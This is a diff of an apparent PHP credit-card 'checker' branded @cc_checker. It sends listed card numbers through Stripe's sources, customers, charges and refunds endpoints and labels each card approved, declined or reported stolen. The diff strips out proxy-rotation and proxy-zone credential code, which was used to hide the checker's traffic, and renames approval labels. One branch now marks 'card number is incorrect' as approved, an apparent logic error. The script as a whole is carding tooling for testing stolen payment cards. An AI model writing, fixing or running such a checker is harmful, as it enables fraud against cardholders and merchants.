@@ -26,23 +26,7 @@ function GetStr($string, $start, $end)
   return $str[0];
 }
 
-///Proxy Function
-function rebootproxys()
-  {
-    $poxySocks = file("proxy.txt");
-    $myproxy = rand(0, sizeof($poxySocks) - 1);
-    $poxySocks = $poxySocks[$myproxy];
-    return $poxySocks;
-  }
-  $poxySocks4 = rebootproxys();
 
-///proxy zone function
-
-$username = 'Put Zone Username Here';
-$password = 'Put Zone Password Here';
-//$port = add port and uncomment ;
-$session = mt_rand();
-$super_proxy = 'zone url here';
 
 
 
@@ -70,9 +54,6 @@ $postcode = $matches1[1][0];
 
 //[Auth Section]
   $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 
   curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -90,9 +71,7 @@ curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+
 
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -117,12 +96,6 @@ $token3 = $cus['id'];
 
 echo "<span>  cvv_check = ".$cvvcheck."</span>";
 
-
-//[Charge Section]
- curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-
   curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -138,9 +111,6 @@ curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 $decline3 = trim(strip_tags(getStr($result3,'"decline_code": "','"')));
 
   $ch = curl_init();
-   curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 
   curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -213,10 +183,10 @@ elseif(strpos($result,"fraudulent")){
 }
 
 elseif(strpos($result2,'"code": "incorrect_cvc"')){
-    echo '<span class="badge badge-info">#Approved</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
+    echo '<span class="badge badge-info">#Approved_CCN</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 }
 elseif(strpos($result1,' "code": "invalid_cvc"')){
-    echo '<span class="badge badge-info">#Approved</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
+    echo '<span class="badge badge-info">#Approved_CCN</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 }
 elseif(strpos($result2,"invalid_account")){
     echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-danger"> 「invalid_account @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
@@ -246,7 +216,7 @@ elseif(strpos($result2, "transaction_not_allowed" )) {
     echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined (transaction_not_allowed) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
 elseif(strpos($result3, "incorrect_cvc" )) {
-    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN3) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
+    echo '<span class="badge badge-success">#Approved_CCN</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN3) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 }
 elseif(strpos($result2, "pickup_card" )) {
     echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
@@ -266,7 +236,7 @@ elseif(strpos($result3, '"code": "processing_error"')) {
     echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「PROCESSING ERROR @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
 elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
+    echo '<span class="badge badge-danger">#Approved_CCN</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
 elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
     echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
